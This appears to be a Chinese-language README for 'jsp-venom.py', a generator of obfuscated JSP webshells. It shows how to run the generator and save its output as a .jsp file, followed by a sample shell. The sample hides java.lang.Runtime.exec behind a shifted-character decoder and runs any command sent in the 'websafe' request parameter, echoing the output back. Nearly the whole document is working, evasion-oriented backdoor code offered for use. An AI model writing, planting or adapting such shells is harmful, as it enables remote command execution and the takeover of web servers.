## 使用方法

```
python3 jsp-venom.py            //生成

python3 jsp-venom.py >  test.jsp    //保存
```

## 生成样例
```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!public String vADM(String mPk){String BJM="";for (int i = 0; i < mPk.length(); i++) {BJM+=(char)(mPk.charAt(i)+-4);}return BJM;}
%>
<% String sbd=request.getParameter("websafe");if(sbd!=null){ Class cjwV = Class.forName(vADM("neze2perk2Vyrxmqi"));
    Process rsSk = (Process) cjwV.getMethod(vADM("i|ig"), String.class).invoke(cjwV.getMethod(vADM("kixVyrxmqi")).invoke(null),sbd); java.io.InputStream in = rsSk.getInputStream();byte[] iLT = new byte[2048];out.print("<pre>");while(in.read(iLT)!=-1){ out.println(new String(iLT)); }out.print("</pre>"); }
%>
```
